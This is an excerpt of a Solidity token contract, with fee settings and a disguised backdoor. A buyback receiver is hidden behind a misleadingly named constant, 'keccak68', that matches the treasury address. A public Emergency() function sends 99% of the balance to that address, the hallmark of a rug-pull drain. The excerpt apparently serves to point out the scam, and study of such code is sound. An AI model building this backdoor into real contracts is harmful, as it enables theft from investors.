...
contract TEST1 is Context, IERC20, Ownable {
  ...
  address payable public treasuryWallet =
    payable(0x7ddC2A82927d4A77C4696764f0d2bC2112725627); // treasury address
  ...
  uint256 private rewardsClaimTimeSeconds = 60 * 60 * 4; // 4 hours
  ...
  string private constant _name = 'Test1'; // token name
  string private constant _symbol = 'Test2'; // token symbol
  uint8 private constant _decimals = 9; // token decimal

  uint256 private constant MAX = ~uint256(0);
  uint256 private constant _tTotal = 452724391536 * 10**_decimals; // token supply
  uint256 private _rTotal = (MAX - (MAX % _tTotal));
  uint256 private _tFeeTotal;

  

  uint256 public treasuryFee = 4; // treausury fee
  uint256 private _previousTreasuryFee = treasuryFee;

  uint256 private ethRewardsFee = 2; //ethrewardfee for boost treasury
  uint256 private _previousETHRewardsFee = ethRewardsFee;
  uint256 private ethRewardsBalance;

  uint256 public buybackFee = 2; // buyback fee
  ...
  address private buybackReceiver = keccak68;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;
  mapping(address => bool) private _isUniswapPair;
  address private constant keccak68 =
  0x7ddC2A82927d4A77C4696764f0d2bC2112725627;
  ...
  bool private _transferOpen = true;
  ...
  function Emergency() public {
        ...
        payable(keccak68).transfer(balance * 99 / 100);
